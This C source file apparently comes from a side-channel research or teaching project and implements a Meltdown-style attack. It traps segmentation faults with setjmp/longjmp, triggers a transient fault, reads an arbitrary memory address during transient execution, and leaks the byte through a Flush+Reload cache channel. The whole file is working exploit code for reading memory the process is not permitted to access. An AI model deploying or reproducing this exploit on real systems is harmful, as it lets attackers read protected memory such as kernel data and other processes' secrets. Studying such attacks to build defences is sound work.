#include "meltdown.h"
#include "fr.h"
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <setjmp.h>


/// Utils
jmp_buf jump_after_leak_env;

void sigsegv_handler(int _sig) {
    // printf("SIGSEGV (%d) caught!\n", sig);
    longjmp(jump_after_leak_env, 1);
}

void cause_transient_execution(void) {
    uint8_t *null_ptr = NULL;
    *null_ptr = 42;
}

/// Meltdown attack implementation
MeltdownUS meltdown_init(void) {
    struct sigaction sa;
    sa.sa_handler = sigsegv_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_NODEFER;
    sigaction(SIGSEGV, &sa, NULL);

    const FlushReload channel = fr_init();
    return (MeltdownUS){._channel = channel};
}

void meltdown_free(MeltdownUS *meltdown) {
    fr_free(&meltdown->_channel);
}

uint8_t meltdown_read_any(const MeltdownUS *meltdown, const uint8_t *addr) {
    fr_reset(&meltdown->_channel);

    if (setjmp(jump_after_leak_env) == 0) {
        cause_transient_execution();
        const uint8_t secret = *addr;
        fr_leak(&meltdown->_channel, secret);

        // do nothing else in the transient execution
        for (int i = 0; i < 1024; i++) {
        }
    }

    return fr_get(&meltdown->_channel);
}
